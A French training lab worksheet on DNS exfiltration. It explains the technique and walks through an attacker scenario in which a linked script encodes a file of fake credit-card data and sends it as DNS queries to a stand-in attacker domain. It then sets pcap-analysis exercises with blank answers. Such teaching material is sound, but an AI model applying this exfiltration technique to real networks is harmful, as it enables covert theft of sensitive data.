# Exfiltration DNS

### Exfiltration DNS : Theorie 

- L'exfiltration DNS est une cyberattaque sur les serveurs via le DNS, qui peut être effectuée manuellement ou automatiquement en fonction de l'emplacement physique de l'attaquant et de la proximité des appareils cibles.   
- Dans un scénario manuel, les attaquants obtiennent souvent un accès physique non autorisé à l'appareil ciblé pour extraire des données de l'environnement.
- Alors que dans l'exfiltration DNS automatisée, les attaquants utilisent des logiciels malveillants pour effectuer l'exfiltration des données à l'intérieur du réseau compromis.

- Le service DNS est généralement disponible sur une machine cible et autorisant le trafic sortant généralement sur le port TCP ou UDP 53. Cela fait du DNS un candidat de choix pour les pirates informatiques à utiliser pour exfiltrer des données.

- L'exfiltration de données via DNS pourrait permettre à un attaquant de transférer un grand volume de données depuis l'environnement cible. De plus, l'exfiltration DNS est principalement utilisée comme moyen de **collecter des informations personnelles** telles que les numéros de sécurité sociale, la propriété intellectuelle ou d'autres informations personnellement identifiables.

- L'exfiltration DNS est principalement utilisée **en ajoutant des chaînes contenant le « butin » souhaité aux requêtes DNS UDP**. La chaîne contenant le butin serait alors envoyée à un serveur DNS malveillant qui enregistre ces requêtes.
- 
- Pour un œil non averti, cela pourrait ressembler à un trafic DNS normal ou ces demandes pourraient être perdues dans le mélange de nombreuses demandes DNS légitimes.

<p align="center">
  <img src="https://cdn.discordapp.com/attachments/798799811482353734/807298488881643550/exfil.png"/>
</p>

---

### Exfiltration DNS : Exemple

- Dans cet exemple de scénario, un attaquant essaie d'exfiltrer des données vers son système et a décidé que sa meilleure option serait d'utiliser des requêtes DNS. 
- L'objectif de l'attaquant est d'exfiltrer des informations sensibles d'une machine sur le réseau de SecureCorp. Dans cet exemple, nous montrerons les étapes qu'un attaquant pourrait suivre pour exfiltrer ces données de la machine compromise.

<img src="https://cdn.discordapp.com/attachments/798799811482353734/807298488881643550/exfil.png"/>

les informations de carte de crédit ont été générés via un faux générateur de cartes de crédit.   
Toutes les informations de carte de crédit sont fausses :)

**Important**
Vous aurez besoin de fichiers pour compléter le reste du TP.

[securecorp.txt](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/securecorp.txt)  
[packety.py](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packety.py)  
[packetGrabber.py](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packetyGrabber.py)  

1. Fichier texte contenant de faux numéros de carte de crédit, noms, adresses.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129675221958696/1.PNG"/>

**Partie encodeur-transmetteur DNS**

2. (packety.py)[https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packety.py]

Lorsque packety.py est exécuté, vous devrez fournir au script l'entrée suivante :

* Nom de fichier : (C'est le fichier que vous essayez d'exfiltrer du réseau de SecureCorp)

* Nom de domaine : ( c'est ici que vous allez mettre votre nom de domaine, par exemple badbaddoma.in )

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129727180472340/2.1.PNG"/>


`python packety.py   
`
`Filename: securecorp.txt   
`
`Domain Name (Example: badbaddoma.in): badbaddoma.in 
`
`[+] Reading file.  
`
`[+] Base64 encoded.  
`
`[+] Base58 encoded.  
`
`Start transmitting... [PRESS ENTER KEY]    
`

- Le code commence par la lecture du fichier texte.   
- Le contenu du fichier texte sera d'abord encodé en Base64 puis en Base58. Cela nous laisse avec une longue chaîne encodée.  
- La chaîne est ensuite divisée en sections de 20 caractères où chaque section aura 3 caractères 'factices' ajoutés pour plus d'obscurcissement.   
- Un caractère sera ajouté au début de la chaîne encodée et deux caractères seront ajoutés.

- Par exemple, une section des données encodées pourrait ressembler à ceci : « 6gfghhjywsas3rg4hda3 ». Une fois les caractères supplémentaires ajoutés, il deviendra "x6gfghhjywsas3rg4hda3yu".
- Une fois que tout est encodé et prêt, le code attendra que l'utilisateur appuie sur "ENTREE" afin de commencer à transmettre les requêtes au serveur DNS.  
- Le serveur DNS a déjà été configuré pour capturer les requêtes entrantes avec 'Wireshark' ou 'tshark'.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129732692967474/3.PNG"/>

- Ensuite, il ne reste plus qu'à attendre que la transmission atteigne 100%. Si l'une des requêtes n'est pas livrée à temps et dans le bon ordre, les données exfiltrées seront incomplètes et inutiles pour l'attaquant.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129738539565066/5.PNG"/>

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129741236502568/6.PNG"/>

**Partie decodeur-recepteur DNS**

3. [packetyGrabber.py] (https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packetyGrabber.py)

Le code demandera à l'utilisateur la saisie suivante :

* Fichier capturé : Il s'agit du fichier .pcap que vous avez capturé sur votre serveur DNS.

* Nom du fichier de sortie : il s'agit du nom du fichier dans lequel les données décodées seront enregistrées.

* Nom de domaine : Ce sera votre nom de domaine.  

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129744641622016/7.PNG"/>

`python3 ~/tools/packety/packetyGrabber.py  
`
`File captured: cap-credit-cards.pcap  
`
`Filename output: credit-cards.txt  
`
`Domain Name (Example: badbaddoma.in): badbaddoma.in  
`
`[+] Domain Name set to badbaddoma.in  
`
`[+] Filtering for your domain name.  
`
`[+] Base 58 decoded.  
`
`[+] Base 64 decoded.  
`
`[+] Output to credit-cards.txt. 
`
- Si tout se passe bien, qu'aucune requête n'a été perdue et que toutes les entrées sont correctes, un fichier avec les données décodées sera enregistré dans le même répertoire à partir duquel vous avez exécuté le code.  

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129748282933258/8.PNG"/>

---

### Exfiltration DNS : Pratique

**Se connecter à la machine cible en SSH**

Utiliser les crédentiels suivants :
* Utilsateur : user
* Mot de passe : P@ssword01

Parcourir les fichiers dans les dossiers :
```console
~/challenges/exfiltration
~/dns-exfil-infil/
```

Aller dans le dossier ci-dessous et lire les instructions dans le fichier TASK :
```console
$ cd ~/challenges/exfiltration/orderlist
```

L'extension de fichier .pcap  est principalement associée avec Wireshark
les fichiers .pcap créés pas Woreshark contiennent les données en paquets d'un réseau. 

Ces fichiers sont utilisés principalement dans l'analyse des caractéristiques du réseau d'un certain données. Ils contribuent également à contrôler avec succès le trafic d'un certain réseau depuis qu'ils sont surveillés par le programme.

- Analyser le fichier order.pcap et détecter le fichier comportant des requêtes suspectes :
```console
Réponse : $ tshark ...
```

Le script `~/dns-exfil-infil/packetyGrabber.py` permet de decrypter les fichiers Wireshark.
```console
$ python3 ~/dns-exfil-infil/packetyGrabber.py
```

Ignorer l'exception levée à la fin du script.

Quel est le nom de la première transaction ? 
```console
Réponse : 
```

Quel est la valeur de la transaction Firewall ?
```console
Réponse : 
```

Aller dans le dossier ci-dessous :
```console
$ cd ~/challenges/exfiltration/identify/
```
Parmi les fichiers `*.pcap` analyser leur contenu :
```console
Réponse : $ tshark ...
```
Si vous peinez à réaliser la commande demander au formateur de vous la fournir



Quel fichier contient des requêtes DNS douteuses ? Pourquoi ?
```console
Réponse : 
```

```console
python3 ~/dns-exfil-infil/packetyGrabber.py
```

Trouver le texte récupéré après avoir décodé les données en utilisant le programe Pyhton packetyGrabber.py qui se trouve dans le dossier `~/dns-exfil-infil/`.
```console
Réponse : 
```
